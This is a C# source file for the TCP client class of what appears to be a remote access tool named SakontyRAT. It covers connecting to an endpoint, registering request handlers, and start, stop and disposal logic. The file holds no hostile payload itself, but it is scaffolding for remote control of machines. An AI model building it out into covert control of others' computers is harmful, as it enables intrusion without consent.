using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Net;
using WatsonTcp;

namespace SakontyRAT.Network
{
    public class SakontyClient : ISakontyPeer, IDisposable
    {
        private WatsonTcpClient _watsonTcpClient = null;
        private Thread _connectionThread = null;
        private Boolean _disposed;
        public bool Running { get => _watsonTcpClient.Connected; }

        private SakontyResourceLocator _resourceLocator = null;

        public SakontyClient(IPEndPoint endPoint)
        {
            _watsonTcpClient = new WatsonTcpClient(endPoint.Address.ToString(), endPoint.Port);

            _resourceLocator = new SakontyResourceLocator();
        }

        /// <summary>
        /// Add Request Handlers
        /// </summary>
        /// <param name="requestHandler"></param>
        public void AddRequestHandler(IRequestHandler requestHandler)
        {
            _resourceLocator.AddRequestHanlder(requestHandler);
        }

        /// <summary>
        /// Start SakontyRAT Client
        /// </summary>
        public void Start()
        {
            if (!Running)
            {
                _watsonTcpClient.Connect();
            }
        }

        /// <summary>
        /// Stop SakontyRAT Client
        /// </summary>
        public void Stop()
        {
            if (Running)
            {
                _watsonTcpClient.Disconnect();
            }
        }

        private void ConnectionThreadStart()
        {
            try
            {
                while (Running)
                {
                }
            }
            catch (Exception ex)
            {
            }
        }

        #region Disposale

        public void Dispose()
        {
            this.Dispose(true);
            GC.SuppressFinalize(this);
        }

        private void Dispose(bool disposing)
        {
            if (this._disposed)
            {
                return;
            }
            if (disposing)
            {
                if (this.Running)
                {
                    this.Stop();
                }
                if (this._connectionThread != null)
                {
                    this._connectionThread.Abort();
                    this._connectionThread = null;
                }
            }
            this._disposed = true;
        }

        #endregion Disposale
    }
}